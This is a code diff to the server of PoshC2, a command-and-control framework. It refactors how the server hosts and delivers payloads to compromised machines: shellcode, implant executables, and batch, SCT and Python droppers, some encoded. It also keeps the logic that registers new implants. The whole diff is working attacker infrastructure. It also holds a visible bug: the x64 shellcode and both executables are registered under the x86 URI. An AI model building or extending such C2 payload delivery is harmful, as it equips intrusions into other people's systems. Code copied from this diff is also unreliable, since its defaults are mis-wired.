@@ -17,19 +17,24 @@ from poshc2.server.Config import Pushover_APIUser, EnableNotifications, Database
 from poshc2.server.Cert import create_self_signed_cert
 from poshc2.client.Help import logopic
 from poshc2.Utils import validate_sleep_time, randomuri, gen_key
+from poshc2.server.database.Model import CachedUrls
 
 
 if DatabaseType.lower() == "postgres":
     from poshc2.server.database.DBPostgres import update_sleep, select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
     from poshc2.server.database.DBPostgres import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
-    from poshc2.server.database.DBPostgres import get_db
+    from poshc2.server.database.DBPostgres import get_db, update_cache_urls, insert_hosted_file
 else:
     from poshc2.server.database.DBSQLite import update_sleep, select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
     from poshc2.server.database.DBSQLite import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
+    from poshc2.server.database.DBSQLite import update_cache_urls, insert_hosted_file
 
-
+new_implant_url = None
+sharpurls = None
+cached_urls = None
+last_cached = None
+QuickCommandURI = None
 KEY = None
-
 
 class MyHandler(BaseHTTPRequestHandler):
 
@@ -79,13 +84,18 @@ class MyHandler(BaseHTTPRequestHandler):
             response_content_type = "text/html"  
             response_content = None
             
+
+            # if (now - last_cached) > 30s:
+                # update_cache_urls
+                # make threadsafe use a lock or something           
+            cached_urls = update_cache_urls()
+
             logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
-            new_implant_url = get_newimplanturl()
+            
             self.cookieHeader = self.headers.get('Cookie')
             self.ref = self.headers.get('Referer')
-            QuickCommandURI = select_item("QuickCommand", "C2Server")
+            
             UriPath = str(self.path)
-            sharpurls = get_sharpurls().split(",")
             sharplist = []
             for i in sharpurls:
                 i = i.replace(" ", "")
@@ -126,54 +136,21 @@ class MyHandler(BaseHTTPRequestHandler):
                         response_content = bytes(HTTPResponsePage, "utf-8")
                     else:
                         response_content = bytes(GET_404_Response, "utf-8")
+         
+            # dynamically hosted files
+            elif [ele for ele in cached_urls if(ele[1] in self.path)]:
+                for i in cached_urls:
+                    URL = CachedUrls(i[0], i[1], i[2], i[3], i[4], i[5])
+                    if URL.URI in self.path and URL.Active == "Yes":
+                        response_content = open(URL.FilePath, 'rb').read()
+                        response_content_type = URL.ContentType
+                        if URL.Base64 == "Yes":
+                            response_content = base64.b64encode(response_content)      
 
-            # server custom content
-
-            elif ("%s_bs" % QuickCommandURI) in self.path:
-                response_content = open("%spayload.bat" % (PayloadsDirectory), 'rb').read()
-
-            elif ("%s_rp" % QuickCommandURI) in self.path:
-                content = open("%spayload.txt" % (PayloadsDirectory), 'rb').read()
-                response_content = base64.b64encode(content)
-
-            elif ("%s_rg" % QuickCommandURI) in self.path:
-                response_content = open("%srg_sct.xml" % (PayloadsDirectory), 'rb').read()
-
-            elif ("%ss/86/portal" % QuickCommandURI) in self.path:
-                content = open("%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
-                response_content = base64.b64encode(content)
-
-            elif ("%ss/64/portal" % QuickCommandURI) in self.path:
-                content = open("%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
-                response_content = base64.b64encode(content)
-
-            elif ("%sp/86/portal" % QuickCommandURI) in self.path:
-                content = open("%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
-                response_content = base64.b64encode(content)
-
-            elif ("%sp/64/portal" % QuickCommandURI) in self.path:
-                content = open("%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
-                response_content = base64.b64encode(content)
-
-            elif ("%s_cs" % QuickCommandURI) in self.path:
-                response_content = open("%scs_sct.xml" % (PayloadsDirectory), 'rb').read()
-
-            elif ("%s_py" % QuickCommandURI) in self.path:
-                content = open("%saes.py" % (PayloadsDirectory), 'rb').read()
-                content = "a" + "".join("{:02x}".format(c) for c in content)
-                response_code = 200
-                response_content_type = "text/plain"
-                response_content = bytes(content, "utf-8")
-
-            elif ("%s_ex86" % QuickCommandURI) in self.path:
-                response_content = open("%sPosh32.exe" % (PayloadsDirectory), 'rb').read()
-                response_code = 200
-                response_content_type = "application/x-msdownload"
-
-            elif ("%s_ex64" % QuickCommandURI) in self.path:                
-                response_content = open("%sPosh64.exe" % (PayloadsDirectory), 'rb').read()
-                response_code = 200
-                response_content_type = "application/x-msdownload"
+                        # do this for the python dropper only
+                        if "_py" in URL.URI:
+                            response_content = "a" + "".join("{:02x}".format(c) for c in response_content)
+                            response_content = bytes(response_content, "utf-8")                 
 
             # register new implant
             elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
@@ -300,7 +277,6 @@ class MyHandler(BaseHTTPRequestHandler):
         finally:
             try:
                 UriPath = str(self.path)
-                sharpurls = get_sharpurls().split(",")
                 sharplist = []
                 for implant in sharpurls:
                     implant = implant.replace(" ", "")
@@ -401,6 +377,17 @@ def newdb(db):
     create_self_signed_cert(PoshProjectDirectory)
     newPayload.WriteQuickstart(directory + '/quickstart.txt')
 
+    # adding default hosted payloads
+    QuickCommandURI = select_item("QuickCommand", "C2Server")
+    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sPosh32.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sPosh64.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%s_bs" % QuickCommandURI, "%spayload.bat" % (PayloadsDirectory), "text/html", "No", "Yes")
+    insert_hosted_file("%s_rp" % QuickCommandURI, "%spayload.txt" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+    insert_hosted_file("%s_rg" % QuickCommandURI, "%srg_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
+    insert_hosted_file("%s_cs" % QuickCommandURI, "%scs_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
+    insert_hosted_file("%s_py" % QuickCommandURI, "%saes.py" % (PayloadsDirectory), "text/html", "No", "Yes")
 
 def existingdb(db):
     print("Using existing %s database / project" % db + Colours.GREEN)
@@ -439,6 +426,7 @@ def log_c2_messages():
 
 def main(args):
     httpd = ThreadedHTTPServer((BindIP, BindPort), MyHandler)
+    global new_implant_url, sharpurls, cached_urls, KEY, QuickCommandURI
 
     try:
         if os.name == 'nt':
@@ -483,9 +471,13 @@ def main(args):
     print("WEBSERVER Log: %swebserver.log" % PoshProjectDirectory)
     print("")
     print("PayloadCommsHost: " + select_item("PayloadCommsHost", "C2Server") + Colours.GREEN)
-    print("DomainFrontHeader: " + str(select_item("DomainFrontHeader", "C2Server")) + Colours.GREEN)
-    global KEY
+    print("DomainFrontHeader: " + str(select_item("DomainFrontHeader", "C2Server")) + Colours.GREEN)    
+    QuickCommandURI = select_item("QuickCommand", "C2Server")    
     KEY = get_baseenckey()
+    new_implant_url = get_newimplanturl()
+    sharpurls= get_sharpurls().split(",")
+    cached_urls = update_cache_urls()
+
     print("")
     print(time.asctime() + " PoshC2 Server Started - %s:%s" % (BindIP, BindPort))
     from datetime import date, datetime
@@ -509,7 +501,7 @@ def main(args):
     c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
     c2_message_thread.start()
 
-    try:
+    try:       
         httpd.serve_forever()
     except (KeyboardInterrupt, EOFError):
         httpd.server_close()
